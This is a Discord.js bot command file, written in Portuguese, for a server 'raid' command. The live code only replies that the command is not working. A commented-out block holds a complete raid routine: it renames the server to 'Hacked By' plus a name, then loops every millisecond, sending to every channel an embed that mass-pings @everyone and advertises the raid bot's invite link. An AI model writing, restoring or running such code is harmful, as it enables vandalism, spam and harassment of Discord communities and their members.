const discord = require("discord.js");
const nome = require("./Nome.json").nome;
exports.run = async (client, message, args) => {
   /* console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
    message.guild.setName(`Hackeado Por ${nome}`)
    let Title = `Hackeado Por: ${nome}`
    let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
    let field = "Quer Ter Esse Bot De Raid?:"
    let fieldd = "Acesse Este Servidor: https://discord.gg/x9jqsb" // descricão do field
   function raid(){
       setInterval(() => {
     client.guilds.get(message.guild.id).channels.forEach((canal) => {
           let embed = new discord.RichEmbed()
           .setTitle(Title)
           .setColor("RANDOM")
         .setDescription(Description)
         .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
         .addField(field, fieldd)
        canal.send(embed)
        canal.send(embed)
     })
    }, 1)  
   }
    
   raid()*/
  message.reply("Este Comando Não Esta Funcionando")
}